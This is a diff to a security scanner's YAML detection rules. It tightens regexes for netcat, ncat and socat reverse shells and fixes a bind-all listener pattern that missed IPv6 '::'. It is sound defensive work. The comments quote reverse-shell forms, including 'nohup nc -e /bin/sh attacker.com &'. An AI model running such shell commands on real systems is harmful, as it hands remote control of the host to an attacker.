@@ -168,10 +168,18 @@ rules:
         # exec-based /dev/tcp reverse shell: `exec 5<>/dev/tcp/host/port`
         - regex: '(?i)\bexec\s+\d*<>\s*/dev/(tcp|udp)/'
           confidence: 0.9
-        - regex: '(?i)\bnc\b[^\n]{0,40}\s-[a-z]*e\b'
+        # -e / --exec must be followed by the program it executes. That is the
+        # flag's entire purpose, so requiring it cannot lose a real reverse
+        # shell — but the bare `nc -e` form is how *security tooling* writes the
+        # signature down, and that was 4 of this rule's 10 corpus hits:
+        # clawdefender's pattern array (`'nc -e'`, `'ncat -e'`, one per line) and
+        # prompt-guard's docs (`| bash /dev/tcp, netcat -e, socat |` in a table).
+        # `nohup nc -e /bin/sh attacker.com &` still fires, because that one is
+        # the payload rather than a name for it.
+        - regex: '(?i)\bnc\b[^\n]{0,40}\s-[a-z]*e\s*=?\s*["'']?(?:[~.]{0,2}/|\$|(?:sh|bash|zsh|cmd|powershell|python3?|perl)\b)'
           confidence: 0.9
-        # ncat/netcat command-execution flags
-        - regex: '(?i)\b(ncat|netcat)\b[^\n]{0,40}(-e\b|--exec|--sh-exec)'
+        # ncat/netcat command-execution flags, same requirement
+        - regex: '(?i)\b(?:ncat|netcat)\b[^\n]{0,40}(?:-e|--exec|--sh-exec)\s*=?\s*["'']?(?:[~.]{0,2}/|\$|(?:sh|bash|zsh|cmd|powershell|python3?|perl)\b)'
           confidence: 0.9
         # socat command-execution endpoints
         - regex: '(?i)\bsocat\b[^\n]{0,80}(EXEC|SYSTEM):'
@@ -187,7 +195,33 @@ rules:
         # powershell reverse shell
         - regex: '(?i)New-Object\s+(System\.)?Net\.Sockets\.TCPClient'
           confidence: 0.8
-        - regex: '(?i)\.bind\(\(?\s*[''"]?(0\.0\.0\.0|::)\b'
+        # Bind-all listener. The old pattern was
+        #   \.bind\(\(?\s*['"]?(0\.0\.0\.0|::)\b
+        # and the trailing \b bound to *both* branches: `::` ends in a non-word
+        # character, so a word boundary after it requires a word character next,
+        # and `s.bind(("::", 8080))` is followed by a quote. **IPv6 bind-all was
+        # invisible to the bind-all rule** while `0.0.0.0` matched — verified
+        # both ways on e21d47f. This is instance four of the class audited in
+        # #159, and the one with a live security consequence: `::` binds every
+        # interface *including* IPv4-mapped addresses, so it is strictly the
+        # broader exposure of the two.
+        #
+        # Rewritten to end on the host's own closing delimiter and the port
+        # instead of a boundary, which also picks up two shapes the old leaf
+        # never had: `[::]` (the bracketed literal) and the empty host, which is
+        # INADDR_ANY by definition — `s.bind(("", 8080))` is bind-all spelled
+        # without a name.
+        #
+        # The port is required to be a non-zero literal or an identifier, which
+        # excludes `s.bind(('', 0))` — the standard "ask the kernel for a free
+        # port" idiom. It is bind-all in the strict sense and benign in every
+        # real use, and it is the one FP this widening would otherwise have
+        # introduced. Corpus: all forms, old and new, measure 0 across 9938
+        # files, so there is no precision evidence either way and the widening is
+        # kept deliberately narrow — `.bind(` only, never `net.Listen`,
+        # `app.run(host=…)` or `server.listen(port, host)`, which are how
+        # ordinary dev servers spell the same address.
+        - regex: '(?i)\.bind\(\s*\(?\s*(?:["''](?:0\.0\.0\.0|::|\[::\])?["'']|0\.0\.0\.0)\s*,\s*(?:[1-9][0-9]*|[A-Za-z_]\w*)'
           confidence: 0.7
     rationale: Reverse shells and bind-all listeners expose the host to remote control (AST01/AST06).
     fix: Bind only to localhost with authentication; remove reverse-shell code.
